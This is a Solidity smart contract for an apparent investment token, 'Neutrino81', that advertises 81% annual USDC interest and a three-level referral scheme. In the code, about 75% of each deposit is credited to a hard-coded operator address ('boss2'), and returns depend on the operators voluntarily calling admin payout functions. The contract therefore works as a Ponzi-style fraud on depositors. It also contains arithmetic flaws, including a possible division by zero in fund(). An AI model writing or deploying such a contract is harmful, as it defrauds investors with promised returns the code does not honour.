1 pragma solidity ^0.4.25;
2 
3 /*
4     [Rules]
5 
6   [✓]  21% Referral program
7             9% => ref link 1 (or Boss1, if none)
8             7% => ref link 2 (or Boss1, if none)
9             5% => ref link 3 (or Boss1, if none)
10         
11   [✓]  4% => dividends for NTS81 holders from each deposit
12 
13   [✓]  81% annual interest in USDC
14             20.25% quarterly payments 
15             6.75% monthly payments 
16     
17   [✓]   Interest periods
18             Q1 15-20 April 2019
19             Q2 15-20 July 2019
20             Q3 15-20 October 2019
21             Q4 15-20 January 2020
22             Q1 15-20 April 2020
23 */
24 
25 
26 contract Neutrino81 {
27     modifier onlyBagholders {
28         require(myTokens() > 0);
29         _;
30     }
31 
32     modifier onlyStronghands {
33         require(myDividends(true) > 0);
34         _;
35     }
36     
37     modifier onlyAdmin {
38         require(msg.sender == admin);
39         _;
40     }
41     
42     modifier onlyBoss2 {
43         require(msg.sender == boss2);
44         _;
45     }
46 
47     string public name = "Neutrino Token Standard 81";
48     string public symbol = "NTS81";
49     address public admin;
50     address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;
51     address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;
52     uint8 constant public decimals = 18;
53     uint8 constant internal welcomeFee_ = 25;
54     uint8 constant internal refLevel1_ = 9;
55     uint8 constant internal refLevel2_ = 7;
56     uint8 constant internal refLevel3_ = 5;
57     uint256 constant internal tokenPrice = 0.001 ether;
58     
59     uint256 constant internal magnitude = 2 ** 64;
60     uint256 public stakingRequirement = 0.05 ether;
61     mapping(address => uint256) internal tokenBalanceLedger_;
62     mapping(address => uint256) public referralBalance_;
63     mapping(address => int256) internal payoutsTo_;
64     mapping(address => uint256) public repayBalance_;
65 
66     uint256 internal tokenSupply_;
67     uint256 internal profitPerShare_;
68     
69     constructor() public {
70         admin = msg.sender;
71     }
72 
73     function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
74         return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
75     }
76 
77     function() payable public {
78         purchaseTokens(msg.value, 0x0, 0x0, 0x0);
79     }
80 
81     function reinvest() onlyStronghands public {
82         uint256 _dividends = myDividends(false);
83         address _customerAddress = msg.sender;
84         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
85         _dividends += referralBalance_[_customerAddress];
86         referralBalance_[_customerAddress] = 0;
87         uint256 _tokens = purchaseTokens(_dividends, 0x0, 0x0, 0x0);
88         emit onReinvestment(_customerAddress, _dividends, _tokens);
89     }
90 
91     function exit() public {
92         address _customerAddress = msg.sender;
93         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
94         if (_tokens > 0) getRepay();
95         withdraw();
96     }
97 
98     function withdraw() onlyStronghands public {
99         address _customerAddress = msg.sender;
100         uint256 _dividends = myDividends(false);
101         payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);
102         _dividends += referralBalance_[_customerAddress];
103         referralBalance_[_customerAddress] = 0;
104         _customerAddress.transfer(_dividends);
105         emit onWithdraw(_customerAddress, _dividends, now);
106     }
107     
108     function getRepay() public {
109         address _customerAddress = msg.sender;
110         uint256 balance = repayBalance_[_customerAddress];
111         require(balance > 0);
112         repayBalance_[_customerAddress] = 0;
113         
114         _customerAddress.transfer(balance);
115         emit onGotRepay(_customerAddress, balance, now);
116     }
117 
118     function myTokens() public view returns (uint256) {
119         address _customerAddress = msg.sender;
120         return balanceOf(_customerAddress);
121     }
122 
123     function myDividends(bool _includeReferralBonus) public view returns (uint256) {
124         address _customerAddress = msg.sender;
125         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
126     }
127 
128     function balanceOf(address _customerAddress) public view returns (uint256) {
129         return tokenBalanceLedger_[_customerAddress];
130     }
131 
132     function dividendsOf(address _customerAddress) public view returns (uint256) {
133         return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
134     }
135 
136     function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
137         address _customerAddress = msg.sender;
138         
139         uint256[4] memory uIntValues = [
140             _incomingEthereum * welcomeFee_ / 100,
141             0,
142             0,
143             0
144         ];
145         
146         uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;
147         uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;
148         uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;
149         
150         uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3];
151         uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];
152         
153         uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
154         uint256 _fee = _dividends * magnitude;
155 
156         require(_amountOfTokens > 0);
157 
158         if (
159             _ref1 != 0x0000000000000000000000000000000000000000 &&
160             tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement
161         ) {
162             referralBalance_[_ref1] += uIntValues[1];
163         } else {
164             referralBalance_[boss1] += uIntValues[1];
165             _ref1 = 0x0000000000000000000000000000000000000000;
166         }
167         
168         if (
169             _ref2 != 0x0000000000000000000000000000000000000000 &&
170             tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement
171         ) {
172             referralBalance_[_ref2] += uIntValues[2];
173         } else {
174             referralBalance_[boss1] += uIntValues[2];
175             _ref2 = 0x0000000000000000000000000000000000000000;
176         }
177         
178         if (
179             _ref3 != 0x0000000000000000000000000000000000000000 &&
180             tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement
181         ) {
182             referralBalance_[_ref3] += uIntValues[3];
183         } else {
184             referralBalance_[boss1] += uIntValues[3];
185             _ref3 = 0x0000000000000000000000000000000000000000;
186         }
187 
188         referralBalance_[boss2] += _taxedEthereum;
189 
190         if (tokenSupply_ > 0) {
191             tokenSupply_ += _amountOfTokens;
192             profitPerShare_ += (_dividends * magnitude / tokenSupply_);
193             _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));
194         } else {
195             tokenSupply_ = _amountOfTokens;
196         }
197 
198         tokenBalanceLedger_[_customerAddress] += _amountOfTokens;
199         int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);
200         payoutsTo_[_customerAddress] += _updatedPayouts;
201         
202         emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now, tokenPrice);
203 
204         return _amountOfTokens;
205     }
206 
207     function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {
208         uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;
209 
210         return _tokensReceived;
211     }
212 
213     function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {
214         uint256 _etherReceived = _tokens / tokenPrice * 1e18;
215 
216         return _etherReceived;
217     }
218     
219     function fund() public payable {
220         uint256 perShare = msg.value * magnitude / tokenSupply_;
221         profitPerShare_ += perShare;
222         emit OnFunded(msg.sender, msg.value, perShare, now);
223     }
224     
225     /* Admin methods */
226     function passRepay(address customerAddress) public payable onlyBoss2 {
227         uint256 value = msg.value;
228         require(value > 0);
229         
230         repayBalance_[customerAddress] += value;
231         emit OnRepayPassed(customerAddress, value, now);
232     }
233 
234     function passInterest(address customerAddress, uint256 usdRate, uint256 rate) public payable {
235      
236         require(msg.sender == admin || msg.sender == boss1 || msg.sender == boss2);
237         require(msg.value > 0);
238 
239         referralBalance_[customerAddress] += msg.value;
240 
241         emit OnInterestPassed(customerAddress, msg.value, usdRate, rate, now);
242     }
243     
244     event onTokenPurchase(
245         address indexed customerAddress,
246         uint256 incomingEthereum,
247         uint256 tokensMinted,
248         address ref1,
249         address ref2,
250         address ref3,
251         uint timestamp,
252         uint256 price
253     );
254 
255     event onReinvestment(
256         address indexed customerAddress,
257         uint256 ethereumReinvested,
258         uint256 tokensMinted
259     );
260 
261     event onWithdraw(
262         address indexed customerAddress,
263         uint256 value,
264         uint256 timestamp
265     );
266     
267     event onGotRepay(
268         address indexed customerAddress,
269         uint256 value,
270         uint256 timestamp
271     );
272     
273     event OnFunded(
274         address indexed source,
275         uint256 value,
276         uint256 perShare,
277         uint256 timestamp
278     );
279     
280     event OnRepayPassed(
281         address indexed customerAddress,
282         uint256 value,
283         uint256 timestamp
284     );
285 
286     event OnInterestPassed(
287         address indexed customerAddress,
288         uint256 value,
289         uint256 usdRate,
290         uint256 rate,
291         uint256 timestamp
292     );
293 }